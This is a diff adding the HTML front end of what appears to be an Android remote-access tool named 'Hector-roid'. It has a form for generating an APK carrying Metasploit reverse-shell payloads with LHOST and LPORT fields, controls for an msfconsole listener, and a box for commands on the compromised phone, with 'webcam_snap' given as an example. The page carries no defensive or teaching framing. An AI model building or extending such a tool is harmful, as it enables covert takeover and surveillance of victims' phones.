@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hector-roid</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Hector-roid </h1>
+
+        <!-- apk generation form -->
+        <div class="section">
+            <h2>Generate APK</h2>
+            <form id="apkForm">
+                <label>Payload:</label>
+                <select name="payload">
+                    <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
+                    <option value="android/shell/reverse_tcp">android/shell/reverse_tcp</option>
+                </select><br>
+                <label>LHOST:</label>
+                <input type="text" name="lhost" value="192.168.1.100"><br>
+                <label>LPORT:</label>
+                <input type="text" name="lport" value="4444"><br>
+                <label>APK Name:</label>
+                <input type="text" name="apkName" value="payload.apk"><br>
+                <button type="submit">Generate APK</button>
+            </form>
+        </div>
+
+        <!-- server controls -->
+        <div class="section">
+            <h2>MSFConsole Server</h2>
+            <button id="startServer">Start Server</button>
+            <button id="stopServer">Stop Server</button>
+        </div>
+
+        <!-- console -->
+        <div class="section">
+            <h2>Console</h2>
+            <textarea id="console" readonly></textarea>
+        </div>
+
+        <!-- command input -->
+        <div class="section">
+            <h2>Run Command</h2>
+            <input type="text" id="command" placeholder="e.g., sysinfo, webcam_snap">
+            <button id="runCommand">Run</button>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
